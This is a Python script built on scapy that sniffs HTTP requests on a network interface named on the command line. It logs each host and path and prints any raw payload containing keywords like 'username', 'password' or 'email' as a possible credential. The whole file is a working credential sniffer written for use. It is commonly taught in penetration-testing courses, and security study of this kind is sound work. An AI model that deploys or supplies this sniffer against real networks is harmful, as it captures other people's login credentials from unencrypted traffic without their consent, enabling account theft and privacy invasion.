#!/usr/bin/env python
import argparse
from scapy.layers import http
from scapy.all import sniff, Raw

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode() if isinstance(packet[http.HTTPRequest].Host, bytes) else packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path.decode() if isinstance(packet[http.HTTPRequest].Path, bytes) else packet[http.HTTPRequest].Path
        print(f"[+] HTTP Request >> {host}{path}")
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode() if isinstance(packet[Raw].load, bytes) else packet[Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print(f"\n\n\n[+] Possible password/username >> {load}\n\n\n")
                    break

iface = get_interface()
if iface:
    sniff(iface=iface, store=False, prn=process_packet)
else:
    print("[-] Please specify an interface with -i or --interface option.")
